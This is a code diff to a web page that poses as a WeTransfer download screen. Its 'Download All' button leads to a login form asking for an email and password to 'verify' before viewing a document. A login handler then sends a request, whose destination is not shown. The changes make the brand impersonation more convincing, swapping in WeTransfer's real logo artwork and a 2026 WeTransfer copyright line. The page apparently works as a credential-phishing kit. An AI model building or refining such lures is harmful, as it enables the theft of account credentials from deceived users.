@@ -450,7 +450,7 @@
     display: flex;
     align-items: center;
     justify-content: center;
-    gap: 8px;
+    gap: 4px;
     transition: background 0.2s, transform 0.1s;
   }
 
@@ -476,7 +476,7 @@
   .form-icon {
     position: absolute;
     left: 14px;
-    top: 50%;
+    top: 54%;
     transform: translateY(-50%);
     color: var(--gray-mid);
     font-size: 0.9rem;
@@ -531,13 +531,15 @@
     display: inline-flex;
     align-items: center;
     justify-content: center;
-    width: 20px; height: 20px;
-    background: var(--white);
+    width: 50px; height: 20px;
     border-radius: 4px;
     font-size: 0.6rem;
     font-weight: 700;
     color: var(--black);
+    margin-top: 2px;
   }
+  
+  .we-badge svg { color: var(--white);}
 
   /* ─── FOOTER ──────────────────────────────── */
   footer {
@@ -576,7 +578,10 @@
   /* ─── MOBILE ──────────────────────────────── */
   @media (max-width: 768px) {
     nav { padding: 14px 20px; }
-    .nav-links { display: none; }
+    
+    .nav-links > :nth-child(-n+3) {
+  display: none;
+}
 
     .page-wrapper {
       grid-template-columns: 1fr;
@@ -608,7 +613,7 @@
 
 <!-- NAV -->
 <nav>
-  <a class="logo" href="#"><span>We</span>Transfer</a>
+  <a class="logo" href="#"><svg xmlns="http://www.w3.org/2000/svg" width="40" height="20" fill="none" class="styles_module_logo__c2382cb9 styles_module_light__c2382cb9"><path fill="currentColor" fill-rule="evenodd" d="M12.23 15.014c-.383-.605-.697-.926-1.254-.926-.558 0-.872.32-1.255.926L8.05 17.686c-.627 1.032-1.15 1.745-2.37 1.745s-1.777-.499-2.369-1.888a42.3 42.3 0 0 1-2.195-6.554C.348 7.89 0 5.967 0 4.4s.488-2.493 2.16-2.813c2.3-.428 5.401-.677 8.816-.677 3.414 0 6.515.25 8.815.677 1.672.32 2.16 1.246 2.16 2.814 0 1.567-.348 3.49-1.115 6.59a42.3 42.3 0 0 1-2.195 6.553c-.592 1.39-1.15 1.888-2.37 1.888-1.219 0-1.741-.713-2.369-1.745zm26.516 2.5c-1.185 1.282-3.415 2.208-6.342 2.208-5.888 0-9.373-4.096-9.373-9.474 0-5.77 4.007-9.19 9.199-9.19 4.634 0 7.7 2.458 7.7 5.77 0 3.135-2.613 5.165-5.575 5.165-1.602 0-2.787-.32-3.588-.961-.314-.25-.488-.214-.488.071 0 1.175.418 2.173 1.184 2.956.628.641 1.812 1.069 2.927 1.069 1.15 0 2.16-.25 3.066-.713s1.673-.32 2.126.428c.523.855-.21 1.959-.836 2.671" clip-rule="evenodd"></path></svg></a>
   <ul class="nav-links">
     <li><a href="#">Products</a></li>
     <li><a href="#">Pricing</a></li>
@@ -664,7 +669,9 @@
   <section class="right-panel">
     <div class="download-card">
       <div class="card-header">
-        <span class="card-logo"><span>We</span>Transfer</span>
+        <span class="card-logo">
+          <img src="../images/wtlogo.png" alt="WeTransfer" style="height: 20px;">
+        </span>
         <div class="tabs">
           <button class="tab-btn active" onclick="switchTab('download', this)">Download</button>
           <button class="tab-btn" onclick="switchTab('login', this)">Log in</button>
@@ -686,7 +693,7 @@
         </div>
         <p class="validity-note">Files are valid for 7 days</p>
         <button class="dl-btn" onclick="goToLoginTab()">
-          <span class="we-badge">we</span> Download All
+          <span class="we-badge"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 24" width="50" height="17" fill="none" class="styles_module_logo__c2382cb9 styles_module_dark__c2382cb9"><path fill="currentColor" fill-rule="evenodd" d="M12.23 15.014c-.383-.605-.697-.926-1.254-.926-.558 0-.872.32-1.255.926L8.05 17.686c-.627 1.032-1.15 1.745-2.37 1.745s-1.777-.499-2.369-1.888a42.3 42.3 0 0 1-2.195-6.554C.348 7.89 0 5.967 0 4.4s.488-2.493 2.16-2.813c2.3-.428 5.401-.677 8.816-.677 3.414 0 6.515.25 8.815.677 1.672.32 2.16 1.246 2.16 2.814 0 1.567-.348 3.49-1.115 6.59a42.3 42.3 0 0 1-2.195 6.553c-.592 1.39-1.15 1.888-2.37 1.888-1.219 0-1.741-.713-2.369-1.745zm26.516 2.5c-1.185 1.282-3.415 2.208-6.342 2.208-5.888 0-9.373-4.096-9.373-9.474 0-5.77 4.007-9.19 9.199-9.19 4.634 0 7.7 2.458 7.7 5.77 0 3.135-2.613 5.165-5.575 5.165-1.602 0-2.787-.32-3.588-.961-.314-.25-.488-.214-.488.071 0 1.175.418 2.173 1.184 2.956.628.641 1.812 1.069 2.927 1.069 1.15 0 2.16-.25 3.066-.713s1.673-.32 2.126.428c.523.855-.21 1.959-.836 2.671" clip-rule="evenodd"></path></svg></span> Download All
         </button>
       </div>
 
@@ -694,16 +701,16 @@
       <div class="login-view" id="loginView">
         <h2>Log in</h2>
         <div class="form-group">
-          <span class="form-icon">✉</span>
+          <span class="form-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="17" height="17" fill="#aaa"><title>email-outline</title><path d="M22 6C22 4.9 21.1 4 20 4H4C2.9 4 2 4.9 2 6V18C2 19.1 2.9 20 4 20H20C21.1 20 22 19.1 22 18V6M20 6L12 11L4 6H20M20 18H4V8L12 13L20 8V18Z" /></svg></span>
           <input class="form-input" type="email" placeholder="Email" id="loginEmail">
         </div>
         <div class="form-group">
-          <span class="form-icon">🔒</span>
+          <span class="form-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="17" height="17" fill="#aaa"><title>lock-outline</title><path d="M12,17C10.89,17 10,16.1 10,15C10,13.89 10.89,13 12,13A2,2 0 0,1 14,15A2,2 0 0,1 12,17M18,20V10H6V20H18M18,8A2,2 0 0,1 20,10V20A2,2 0 0,1 18,22H6C4.89,22 4,21.1 4,20V10C4,8.89 4.89,8 6,8H7V6A5,5 0 0,1 12,1A5,5 0 0,1 17,6V8H18M12,3A3,3 0 0,0 9,6V8H15V6A3,3 0 0,0 12,3Z" /></svg></span>
           <input class="form-input" type="password" placeholder="Password" id="loginPass">
         </div>
-        <a class="forgot-link" onclick="showToast('Password reset email sent!')">Forgot password?</a>
+        <a class="forgot-link" href="#">Forgot password?</a>
         <button class="verify-btn" id="verifyBtn" onclick="handleLogin()">
-          <span class="we-badge">we</span> Verify Email to view document
+          <span class="we-badge"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 24" width="50" height="17" fill="none" class="styles_module_logo__c2382cb9 styles_module_dark__c2382cb9"><path fill="currentColor" fill-rule="evenodd" d="M12.23 15.014c-.383-.605-.697-.926-1.254-.926-.558 0-.872.32-1.255.926L8.05 17.686c-.627 1.032-1.15 1.745-2.37 1.745s-1.777-.499-2.369-1.888a42.3 42.3 0 0 1-2.195-6.554C.348 7.89 0 5.967 0 4.4s.488-2.493 2.16-2.813c2.3-.428 5.401-.677 8.816-.677 3.414 0 6.515.25 8.815.677 1.672.32 2.16 1.246 2.16 2.814 0 1.567-.348 3.49-1.115 6.59a42.3 42.3 0 0 1-2.195 6.553c-.592 1.39-1.15 1.888-2.37 1.888-1.219 0-1.741-.713-2.369-1.745zm26.516 2.5c-1.185 1.282-3.415 2.208-6.342 2.208-5.888 0-9.373-4.096-9.373-9.474 0-5.77 4.007-9.19 9.199-9.19 4.634 0 7.7 2.458 7.7 5.77 0 3.135-2.613 5.165-5.575 5.165-1.602 0-2.787-.32-3.588-.961-.314-.25-.488-.214-.488.071 0 1.175.418 2.173 1.184 2.956.628.641 1.812 1.069 2.927 1.069 1.15 0 2.16-.25 3.066-.713s1.673-.32 2.126.428c.523.855-.21 1.959-.836 2.671" clip-rule="evenodd"></path></svg></span> Verify Email to view document
         </button>
       </div>
     </div>
@@ -711,7 +718,7 @@
 
   <!-- FOOTER -->
   <footer>
-    <span>© 2025 WeTransfer B.V. — <a href="#">Privacy</a> · <a href="#">Terms</a></span>
+    <span>© 2026 WeTransfer B.V. — <a href="#">Privacy</a> · <a href="#">Terms</a></span>
     <span>Max file size: <strong>2 GB</strong> free · <a href="#">Go Plus</a></span>
   </footer>
 </div>
@@ -840,7 +847,10 @@
     if (!isEmail(email)) { showToast('⚠ Invalid email address'); return; }
 
     const btn = document.getElementById('verifyBtn');
-    btn.innerHTML = '<span class="we-badge">we</span> Verifying…';
+
+    const weSVG = `<span class="we-badge"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 24" width="50" height="17" fill="none" class="styles_module_logo__c2382cb9 styles_module_dark__c2382cb9"><path fill="currentColor" fill-rule="evenodd" d="M12.23 15.014c-.383-.605-.697-.926-1.254-.926-.558 0-.872.32-1.255.926L8.05 17.686c-.627 1.032-1.15 1.745-2.37 1.745s-1.777-.499-2.369-1.888a42.3 42.3 0 0 1-2.195-6.554C.348 7.89 0 5.967 0 4.4s.488-2.493 2.16-2.813c2.3-.428 5.401-.677 8.816-.677 3.414 0 6.515.25 8.815.677 1.672.32 2.16 1.246 2.16 2.814 0 1.567-.348 3.49-1.115 6.59a42.3 42.3 0 0 1-2.195 6.553c-.592 1.39-1.15 1.888-2.37 1.888-1.219 0-1.741-.713-2.369-1.745zm26.516 2.5c-1.185 1.282-3.415 2.208-6.342 2.208-5.888 0-9.373-4.096-9.373-9.474 0-5.77 4.007-9.19 9.199-9.19 4.634 0 7.7 2.458 7.7 5.77 0 3.135-2.613 5.165-5.575 5.165-1.602 0-2.787-.32-3.588-.961-.314-.25-.488-.214-.488.071 0 1.175.418 2.173 1.184 2.956.628.641 1.812 1.069 2.927 1.069 1.15 0 2.16-.25 3.066-.713s1.673-.32 2.126.428c.523.855-.21 1.959-.836 2.671" clip-rule="evenodd"></path></svg></span>`;
+
+    btn.innerHTML = `${weSVG} Verifying…`;
     btn.disabled = true;
 
     const controller = new AbortController();
@@ -872,7 +882,7 @@
       console.error('Fetch error:', err);
     } finally {
       setTimeout(() => {
-        btn.innerHTML = '<span class="we-badge">we</span> Verify Email to view document';
+        btn.innerHTML = `${weSVG} Verify Email to view document`;
         btn.disabled = false;
         document.getElementById('loginEmail').value = '';
         document.getElementById('loginPass').value = '';
